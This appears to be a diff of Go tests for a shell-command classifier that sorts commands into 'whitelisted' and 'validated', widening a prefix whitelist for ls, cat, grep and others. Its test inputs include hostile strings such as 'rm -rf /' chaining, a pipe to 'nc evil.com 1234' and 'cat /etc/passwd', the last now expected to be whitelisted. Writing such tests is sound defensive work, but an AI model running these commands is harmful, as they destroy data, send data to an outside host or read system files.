@@ -9,13 +9,18 @@ func TestClassifyWhitelisted(t *testing.T) {
 		cmd  string
 		name string
 	}{
-		{"ls", "bare ls"},
 		{"pwd", "bare pwd"},
 		{"date", "bare date"},
 		{"whoami", "bare whoami"},
 		{"env", "bare env"},
 		{"tree", "bare tree"},
-		{"uname", "bare uname"},
+		{"id", "bare id"},
+		{"hostname", "bare hostname"},
+		{"uptime", "bare uptime"},
+		{"df", "bare df"},
+		{"free", "bare free"},
+		{"ps", "bare ps"},
+		{"history", "bare history"},
 	}
 	for _, tc := range cases {
 		t.Run(tc.name, func(t *testing.T) {
@@ -91,6 +96,70 @@ func TestClassifyWhichWithMetachars(t *testing.T) {
 	}
 }
 
+// TestClassifyPrefixWhitelisted verifies that prefix-whitelisted commands are
+// classified as "whitelisted" when invoked bare or with arguments and no shell metacharacters.
+func TestClassifyPrefixWhitelisted(t *testing.T) {
+	cases := []struct {
+		cmd  string
+		name string
+	}{
+		{"ls", "bare ls"},
+		{"ls -la", "ls with flags"},
+		{"ls -la /tmp", "ls with flags and path"},
+		{"uname", "bare uname"},
+		{"uname -a", "uname with flag"},
+		{"cat README.md", "cat with file"},
+		{"cat /etc/passwd", "cat with path"},
+		{"head -n 10 file.txt", "head with args"},
+		{"tail -f log.txt", "tail with args"},
+		{"grep foo bar.txt", "grep with args"},
+		{"find . -name '*.go'", "find with args"},
+		{"cd /tmp", "cd with path"},
+		{"echo hello", "echo with args"},
+		{"echo hello world", "echo with multiple args"},
+		{"wc -l file.txt", "wc with args"},
+		{"file README.md", "file with arg"},
+		{"du -sh .", "du with args"},
+		{"stat file.txt", "stat with arg"},
+		{"realpath .", "realpath with arg"},
+		{"printf '%s\\n' hello", "printf with args"},
+		{"  ls -la  ", "ls with surrounding spaces"},
+	}
+	for _, tc := range cases {
+		t.Run(tc.name, func(t *testing.T) {
+			got := classifyCommand(tc.cmd)
+			if got != "whitelisted" {
+				t.Errorf("classifyCommand(%q) = %q, want %q", tc.cmd, got, "whitelisted")
+			}
+		})
+	}
+}
+
+// TestClassifyPrefixWithMetachars verifies that prefix-whitelisted commands containing
+// shell metacharacters are classified as "validated".
+func TestClassifyPrefixWithMetachars(t *testing.T) {
+	cases := []struct {
+		cmd  string
+		name string
+	}{
+		{"cat /etc/passwd; rm -rf /", "cat with semicolon chaining"},
+		{"echo hello | nc evil.com 1234", "echo with pipe"},
+		{"ls && rm -rf /", "ls with ampersand chaining"},
+		{"grep foo bar.txt > /tmp/out", "grep with redirect"},
+		{"find . -exec rm {} ;", "find with semicolon in exec"},
+		{"cat file `whoami`", "cat with backtick"},
+		{"echo $(id)", "echo with command substitution"},
+	}
+	for _, tc := range cases {
+		t.Run(tc.name, func(t *testing.T) {
+			got := classifyCommand(tc.cmd)
+			if got != "validated" {
+				t.Errorf("classifyCommand(%q) = %q, want %q", tc.cmd, got, "validated")
+			}
+		})
+	}
+}
+
 // TestClassifyExactWhitelistedVariation verifies that variations of exact whitelisted
 // commands with different arguments are classified as "validated".
 func TestClassifyExactWhitelistedVariation(t *testing.T) {
@@ -132,17 +201,18 @@ func TestClassifyWhitelistedWithSurroundingSpaces(t *testing.T) {
 	}
 }
 
-// TestClassifyWhitelistedWithArgs verifies that whitelisted commands with arguments
-// are classified as "validated" because arguments can be abused.
-func TestClassifyWhitelistedWithArgs(t *testing.T) {
+// TestClassifyBareWhitelistedWithArgs verifies that bare-only whitelisted commands
+// with arguments are classified as "validated" because arguments can be abused.
+func TestClassifyBareWhitelistedWithArgs(t *testing.T) {
 	cases := []struct {
 		cmd  string
 		name string
 	}{
-		{"ls -la /tmp", "ls with flags"},
-		{"uname -a", "uname with flag"},
 		{"tree .", "tree with path"},
 		{"env FOO=bar", "env with assignment"},
+		{"df -h", "df with flag"},
+		{"free -m", "free with flag"},
+		{"ps aux", "ps with flags"},
 	}
 	for _, tc := range cases {
 		t.Run(tc.name, func(t *testing.T) {
@@ -168,9 +238,7 @@ func TestClassifyValidated(t *testing.T) {
 		{"go build ./...", "go command"},
 		{"docker run hello", "docker command"},
 		{"make all", "make command"},
-		{"echo hello", "echo with args"},
-		{"cat /etc/passwd", "cat with path"},
-		{"cd /tmp", "cd with path"},
+		{"ssh user@host", "ssh command"},
 	}
 	for _, tc := range cases {
 		t.Run(tc.name, func(t *testing.T) {
